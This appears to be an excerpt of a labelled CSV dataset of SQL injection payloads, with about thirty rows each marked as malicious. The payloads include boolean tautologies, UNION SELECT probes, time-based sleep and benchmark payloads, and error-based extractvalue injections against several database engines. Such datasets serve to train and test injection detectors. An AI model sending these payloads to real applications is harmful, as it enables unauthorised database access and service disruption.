row_index,payload_norm,label,sqli_type_hint
9840,-6802 ) as coyv where 5693 = 5693 or 8571 = 8571--,1,
9841,"-3817"" ) as vugz where 3064 = 3064 or 9323 = 9323#",1,
9842,( select * from ( select ( sleep ( 5 ) ) ) srmq ) -- mmjk,1,
9843,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1,
9844,"1%"" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
9845,"1"" ) and sleep ( 5 ) and ( ""fsuf"" like ""fsuf",1,
9846,"1"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""prhp"" = ""prhp",1,
9847,"1 where 9279 = 9279 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
9848,1%' ) ) and 3721 = 2597#,1,
9849,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( ""woun"" like ""woun",1,
9850,"1"" ) ) as yfpl where 4820 = 4820 union all select null,null,null,null,null,null,null--",1,
9851,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ),1,
9852,-9581 ) as jkqo where 5200 = 5200 or 6872 = 6872--,1,
9853,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 3124 = 3124,1,
9854,"1"" ) ) as wfne where 8933 = 8933",1,
9855,-7633' ) as aslj where 2317 = 2317 or 8571 = 8571--,1,
9856,"1 ) as ezje where 5234 = 5234 and make_set ( 8403 = 8403,8899 ) --",1,
9857,"1' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'wgpg' like 'wgpg",1,
9858,1' ) and ( 2763 = 4004 ) *4004 and ( 'dtts' = 'dtts,1,
9859,"1"" ) as nyui where 2511 = 2511",1,
9860,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 'qdhz' = 'qdhz",1,
9861,"1'+ ( select 'arqt' where 2336 = 2336 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
9862,"-1401"" ) ) union all select 3480,3480,3480,3480,3480,3480--",1,
9863,end and ( ( ( 'ycte' = 'ycte,1,
9864,"1"" ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ""cyyh"" = ""cyyh",1,
9865,"select sleep ( 5 ) and ( ( ( ""uvzc"" like ""uvzc",1,
9866,-8010' or ( 2225 = 8491 ) *8491 and 'eipf' = 'eipf,1,
9867,"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""icow"" like ""icow",1,
9868,select ( case when ( 5847 = 2826 ) then 5847 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
9869,"1' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'ibav' = 'ibav",1,
